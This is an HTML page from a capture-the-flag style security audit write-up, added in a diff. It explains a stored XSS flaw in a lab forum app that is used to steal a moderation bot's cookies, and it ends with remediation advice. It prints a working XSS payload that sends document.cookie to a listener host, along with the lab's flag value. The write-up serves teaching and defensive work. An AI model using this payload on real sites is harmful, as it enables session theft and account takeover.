@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>08-Stored-XSS — Darkly v2 audit</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div class="layout">
+<nav class="side"><a href="index.html">Overview</a>
+<a href="00-Recon.html">00-Recon</a>
+<a href="01-Weak-Password-BruteForce.html">01-Weak-Password-BruteForce</a>
+<a href="02-Broken-Password-Reset.html">02-Broken-Password-Reset</a>
+<a href="03-IDOR-Profile.html">03-IDOR-Profile</a>
+<a href="04-PrivEsc-Mass-Assignment.html">04-PrivEsc-Mass-Assignment</a>
+<a href="05-JWT-Forgery.html">05-JWT-Forgery</a>
+<a href="06-XXE-SSRF.html">06-XXE-SSRF</a>
+<a href="07-PocketBase-Admin.html">07-PocketBase-Admin</a>
+<a href="08-Stored-XSS.html" class="active">08-Stored-XSS</a>
+<a href="09-Reflected-XSS.html">09-Reflected-XSS</a>
+<a href="10-Broken-Access-Grades.html">10-Broken-Access-Grades</a>
+<a href="11-Open-Redirect.html">11-Open-Redirect</a>
+<a href="12-Unrestricted-File-Upload.html">12-Unrestricted-File-Upload</a></nav>
+<main class="content">
+<div class="crumb">Darkly v2 — security audit</div>
+<h1>Breach 08 — Stored XSS → moderation-bot cookie theft</h1>
+<p><strong>Flag:</strong> <code>FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}</code> <strong>Type:</strong> OWASP A03 — Injection (Cross-Site Scripting, stored)</p>
+<h2>How it works</h2>
+<p>Forum posts and comments render user-supplied HTML <strong>unsanitised</strong> — the UI says *"HTML supported for formatting"* and the source comments confirm *"content goes straight into the DB"* and *"the 'HTML is supported' note is not ironic at all."*</p>
+<p>So we post a thread whose body is:</p>
+<pre class="code"><code>&lt;img src=x onerror=&quot;new Image().src=&#x27;http://10.0.2.2:9900/steal?c=&#x27;+encodeURIComponent(document.cookie)&quot;&gt;</code></pre>
+<p>An <strong>automated moderation bot</strong> opens every new thread within ~a minute in a real browser (banner: *"Every new post is opened by our automated moderation bot"*). Crucially, the source notes *"the moderation bot opens every thread with a live session… and a 'flag' cookie that isn't httpOnly."* The payload runs in the bot's context and sends <code>document.cookie</code> to our listener (the VM reaches the host at <code>10.0.2.2</code>). The exfiltrated cookies contain:</p>
+<pre class="code"><code>session=&lt;bot JWT&gt;; flag=FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}</code></pre>
+<h2>Impact</h2>
+<p>Script execution in other users' authenticated sessions: session/cookie theft (the session JWT is not <code>HttpOnly</code>, Breach 05), account takeover, and actions performed as the victim. Reflected XSS also exists in the newsletter banner (Breach 09).</p>
+<h2>Remediation</h2>
+<ul>
+<li>Contextually output-encode all user data; do <strong>not</strong> render user HTML. If rich</li>
+</ul>
+<p>  text is required, sanitise with an allow-list (e.g. bleach/DOMPurify).</p>
+<ul>
+<li>Set the session cookie <code>HttpOnly</code> (and <code>Secure</code>, <code>SameSite</code>).</li>
+<li>Add a strict <code>Content-Security-Policy</code> to neutralise injected scripts.</li>
+</ul>
+<footer>Generated from 08-Stored-XSS/explanation.md · do not edit the HTML by hand — run <code>python3 docs/build.py</code></footer>
+</main>
+</div>
+</body>
+</html>
